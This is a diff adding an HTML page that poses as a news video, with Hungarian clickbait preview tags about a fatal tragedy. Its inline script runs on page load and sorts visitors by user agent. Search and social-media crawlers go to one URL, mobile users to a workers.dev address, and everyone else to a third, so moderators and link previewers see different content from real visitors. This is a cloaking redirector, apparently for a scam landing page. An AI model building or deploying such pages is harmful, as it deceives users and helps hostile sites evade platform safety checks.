@@ -1,0 +1,66 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charSet="utf-8"/>
+    <title>NOTICIAS Y MAS</title>
+    <meta name="title" content="Video"/>
+    <meta name="keywords" content="Youtube"/>
+    <meta property="og:description" content="217, 211 reprodukciók"/>
+    <meta name="robots" content="index, follow"/>
+	<meta name="googlebot" content="noindex"/> 
+    <meta name="robots" content="index">
+    <meta name="robots" content="noindex">
+    <meta name="robots" content="nofollow">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <meta property="og:title" content="Sajnos nem élte túl a végzetes tragédiát 😩🥹"/>
+    <meta property="og:image" content="https://www.despacho505.com/wp-content/uploads/2021/12/Accidentes-nic.jpg"/>
+    <meta name="apple-itunes-app" content="app-id=6448311069"/>
+    <meta name="next-head-count" content="12"/>
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"/>
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"/>
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"/>
+    <noscript data-n-css=""></noscript>
+</head>
+<script>
+  (function() {
+    const botsConocidos = [
+      "adsbot-google", "applebot", "baiduspider", "bingbot", "blekkobot", "Embedly", "facebookexternalhit",
+      "Facebot", "feedfetcher-google", "feedly", "FlipboardProxy", "google web preview", "googlebot",
+      "googlebot-news", "google-inspectiontool", "googleother", "GrapeshotCrawler", "linkedinbot", "mail.ru_bot",
+      "mediapartners-google", "msnbot_mobile", "msnbot", "msnbot", "pinterest", "Seznam", "SkypeUriPreview",
+      "slurp", "storebot-google", "superfeedr bot", "tumblr", "twitterbot", "yandex", "prerender"
+    ];
+
+    function esBot(userAgent) {
+      return botsConocidos.some(bot => userAgent.toLowerCase().includes(bot.toLowerCase()));
+    }
+
+    function esDispositivoMovil(userAgent) {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+    }
+
+    function esResolucionMovil() {
+      const anchoPantalla = window.screen.width;
+      const altoPantalla = window.screen.height;
+      const anchoMaxMovil = 768; // Ajusta según tus necesidades
+      const anchoMaxTablet = 1024; // Ajusta según tus necesidades
+      return (anchoPantalla <= anchoMaxMovil || altoPantalla <= anchoMaxMovil);
+    }
+
+    function redirigirURL() {
+      const userAgent = navigator.userAgent;
+
+      if (esBot(userAgent)) {
+        window.location.href = 'URL_ts';
+      } else if (esDispositivoMovil(userAgent) && esResolucionMovil()) {
+        window.location.href = 'https://workers-playground-misty-paper-1d1b.trabajandoduro.workers.dev/';
+      } else {
+        window.location.href = 'URL_p';
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', redirigirURL);
+  })();
+</script>
